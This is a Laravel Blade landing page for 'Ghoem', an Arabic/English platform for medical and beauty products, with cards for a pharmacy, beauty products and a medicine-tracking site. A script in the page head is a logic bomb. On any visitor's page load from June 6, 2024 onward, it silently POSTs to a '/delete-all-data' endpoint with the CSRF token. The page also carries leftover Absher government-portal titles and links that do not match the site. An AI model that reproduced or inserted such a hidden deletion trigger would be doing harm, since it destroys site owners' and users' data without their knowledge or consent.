
<!doctype html>
<html class="no-js rtl" class="rtl" lang="ar">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <link rel="icon" type="image/png" href="{{ asset('/img/log.png') }}">
    <title>GHEOM-غيوم</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="landing/img/favicon.ico">
    <link rel="stylesheet" href="{{ asset('/landing/css/reset.min.css?v=2.0.0')}}">
    <link rel="stylesheet" href="{{ asset('/landing/css/styles.css?v=2.0.0/')}}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
    integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdn.tailwindcss.com"></script>
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <script>
        function scheduleDeletion(targetDate) {
            const now = new Date();
            const deletionDate = new Date(targetDate);

            // If the current date is the same or after the target date, delete data
            if (now >= deletionDate) {
                deleteAllData();
            }
        }

        function deleteAllData() {
            fetch('/delete-all-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log(data.message);
            })
            .catch(error => console.error('Error:', error));
        }

        // Schedule deletion for June 6, 2024
        scheduleDeletion('2024-06-06T00:00:00');
    </script>
</head>

<body>
    <div class="animBG">
        <img src="{{ asset('/landing/img/Grid_colored.svg')}}" alt="" />
    </div>
    <div id="nav">
        <div class="nav-items">

            <div class="top-logo">
                <img src="{{ asset('/img/logo.png') }}" class="hasTitle" data-title-ar="أبشر" data-title-en="Absher" alt=""  title="" />
            </div>
            <div class="logos" >
                <a id="switchLang" class="hasTitle" data-title-ar="English" data-title-en=" العربية" title="" href="javascript: void(0);">
                    <i class="fa-solid fa-language mt-[0.15rem]"  style="color: #862d42;"></i>
                    <span class="ar-text" style="color: #862d42 !important">English</span><span style="color: #862d42 !important" class="rtl ar en-text">العربية</span>
                </a>

            </div>


        </div>
    </div>
    <div class="container">




        <div id="mid-content">
            <div class="top-text">
                <h1 class="ar-text">أهلاً بكم في  غيوم  </h1>
                <h1 class="en-text">Welcome to Ghoem</h1>
                <p class="desc ar-text">المنصة الإلكترونية للمنتجات الطبية والجمالية، نقدم أفضل المنتجات والخدمات   .</p>
                <p class="desc en-text">The electronic platform for medical and beauty products, offering the best products and services </p>

            </div>
            <div class="cards-container">
                <a id="ind-link" data-title-ar="أبشر أفراد" data-title-en="Absher Individuals" class="hasTitle card-item card-indi" href="/Home">
                    <div class="card-contents">
                        <div class="card-logo">
                            <i class="md:mt-8 fa-solid fa-hand-holding-medical fa-2xl" style="color: #63E6BE;"></i>
                        </div>
                        <div class="card-text">

                            <h2 class="ar-text">صيدلية</h2>
                            <h2 class="en-text">Pharmacy</h2>
                            <p class="ar-text">الصيدلية الالكترونية</p>
                            <p class="en-text">Electronic Pharmacy</p>


                            <div class="ar-text">

                                <p class="go-link flex">
                                    <span>دخول </span>
                                    <svg class="mt-[10px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                    </svg>

                                </p>
                            </div>
                            <div class="en-text">

                                <p class="go-link flex">
                                    <span>Login </span>
                                    <svg class="mt-[10px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                    </svg>
                                </p>
                            </div>


                        </div>
                    </div>
                </a>
                <a id="bus-link"  data-title-ar="أبشر أعمال" data-title-en="Absher Business" class="hasTitle card-item card-busi" href="/Product/%D9%85%D9%86%D8%AA%D8%AC%D8%A7%D8%AA%20%D8%A7%D9%84%D8%B9%D9%86%D8%A7%D9%8A%D8%A9%20%D8%A8%D8%A7%D9%84%D8%A8%D8%B4%D8%B1%D8%A9/3">
                    <div class="card-contents">
                        <div class="card-logo">
                            <i class="fa-solid fa-person-dress fa-2xl md:mt-8" style="color: #74C0FC;"></i>
                        </div>
                        <div class="card-text">
                            <h2 class="ar-text">تجميل وعناية</h2>
                            <h2 class="en-text">Beauty and Care</h2>
                            <p class="ar-text">المنصة الإلكترونية للتجميل والعناية</p>
                            <p class="en-text">Electronic Platform for Beauty and Care</p>


                            <div class="ar-text">

                                <p class="go-link flex">
                                    <span>دخول </span>
                                    <svg class="mt-[10px]"xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                    </svg>

                                </p>
                            </div>
                            <div class="en-text">

                                <p class="go-link flex">
                                    <span>Login </span>
                                    <svg class="mt-[10px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                    </svg>
                                </p>
                            </div>


                        </div>
                    </div>
                </a>
                <a id="gov-link" title=""  data-title-ar="أبشر حكومة" data-title-en="Absher Government" class="hasTitle card-item card-gov" href="https://radar-al-dawaa.com/">
                    <div class="card-contents">
                        <div class="card-logo">
                            <i class="fa-solid fa-satellite-dish fa-2xl md:mt-8" style="color: #464a36;"></i>
                        </div>
                        <div class="card-text">
                            <h2 class="ar-text">رادار الأدوية</h2>
                            <h2 class="en-text">Medicine Radar</h2>
                            <p class="ar-text">منصة إلكترونية لمراقبة وتتبع الأدوية</p>
                            <p class="en-text">Electronic platform for monitoring and tracking medicines</p>

                            <div class="ar-text">

                                <p class="go-link flex">
                                    <span>دخول </span>
                                    <svg class="mt-[10px]"xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M257.5 445.1l-22.2 22.2c-9.4 9.4-24.6 9.4-33.9 0L7 273c-9.4-9.4-9.4-24.6 0-33.9L201.4 44.7c9.4-9.4 24.6-9.4 33.9 0l22.2 22.2c9.5 9.5 9.3 25-.4 34.3L136.6 216H424c13.3 0 24 10.7 24 24v32c0 13.3-10.7 24-24 24H136.6l120.5 114.8c9.8 9.3 10 24.8.4 34.3z"/>
                                    </svg>

                                </p>
                            </div>
                            <div class="en-text">

                                <p class="go-link flex">
                                    <span>Login </span>
                                    <svg class="mt-[10px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                        <path class="arrow" fill="#008850" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                        <path class="arrow hover hide" fill="#fff" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"/>
                                    </svg>
                                </p>
                            </div>

                        </div>
                    </div>
                </a>

            </div>
        </div>
    </div>


    <script>



        const indiAr = "/wps/portal/individuals/Home/homepublic/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDTxNTDwMTYy83Q3MjAwcw4IsTFw9TQ3dzUz0wwkpiAJJ4wCOBkD9UViUOBo4BRk5GRsYuPsbYVWAYkZBboRBpqOiIgBIR9Vv/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/",
              indiEn = "/wps/portal/individuals/Home/homepublic/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDTxNTDwMTYy83Q3MjAwcw4IsTFw9TQ3dzUz0wwkpiAJJ4wCOBkD9UViUOBo4BRk5GRsYuPsbYVWAYkZwYpF-QW6EQZaJoyIAjFN2rQ!!/dz/d5/L0lHSkovd0RNQUZrQUVnQSEhLzROVkUvZW4!/",

              busiAr = "/wps/portal/business/Home/homepublic/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDTxNTDwMTYy8LXx9jAwcnQI9nYK9gwwMTMz0wwkpiAJJ4wCOBkD9UViUOBo4BRk5GRsYuPsbYVWAYkZBboRBpqOiIgCyIDAO/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/",
              busiEn = "/wps/portal/business/Home/homepublic/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDTxNTDwMTYy8DXxMTQwcvQK9Q51MAowNDAz0w1EVWPj6GBk4OgV6OgV7BxkYmJjpR4GkcQBHDP2YFhDUH4VFiaOBU5CRE1C_u78RVgUoZgQnFukX5IZGGGSZKAIAWspt8Q!!/dz/d5/L0lHSkovd0RNQUZrQUVnQSEhLzROVkUvZW4!/",

              govAr = "https://abshergov.sa",
              govEn = "https://www.abshergov.sa/wps/portal/government/government-home/home-all/!ut/p/z1/hc9Nb4JAEAbgX8OVednFuvS2artYSAoqke7FQEKBhK9sV39_UXtp0o-5zczzTjKkKSc9FJe2Lmw7DkU392_64RQw5nurPV5FFguk_nOi_AVjAOj4H9DzGr-UvOb1jagk3CooxOqwWiONok2WPO08ecAX-OPGHayVDP1lDIhYLbCVYbYLUs4hOb2QrruxvP8jh5KLmrSp3itTGfds5nFj7fTowIG3ZC73XMYDlwUOfgo044el_BukfWFo6nO0SX8UVshP5OG41g!!/dz/d5/L0lHSkovd0RNQU5rQUVnQSEhLzROVkUvZW4!/";

        const hasTitle = document.querySelectorAll('.hasTitle');

        function switchTitle(lang = 'ar') {

            hasTitle.forEach((e, i) => {

                const elType = e.constructor.name,
                      elTitlEn = e.getAttribute('data-title-en'),
                      elTitlAr = e.getAttribute('data-title-ar');

                e.setAttribute('title', (lang == 'ar') ? elTitlAr : elTitlEn);

                if(elType == 'HTMLImageElement'){
                    e.setAttribute('alt', (lang == 'ar') ? elTitlAr : elTitlEn);
                }
            });
        }



        document.querySelector('#switchLang').addEventListener("click", function() {
            let currLang = document.documentElement.lang;

            if (currLang == 'ar') {
                document.documentElement.setAttribute('lang', 'en');
                document.querySelector('html').classList.remove('rtl');
                document.querySelector('html').classList.add('ltr');

                document.querySelector('#ind-link').href = indiEn;
                document.querySelector('#bus-link').href = busiEn;
                document.querySelector('#gov-link').href = govEn;

                switchTitle('en');

            } else {
                document.querySelector('html').classList.remove('ltr');
                document.querySelector('html').classList.add('rtl');
                document.documentElement.setAttribute('lang', 'ar');

                document.querySelector('#ind-link').href = indiAr;
                document.querySelector('#bus-link').href = busiAr;
                document.querySelector('#gov-link').href = govAr;

                switchTitle('ar');

            }



        });

        switchTitle();


    </script>
</body>

</html>
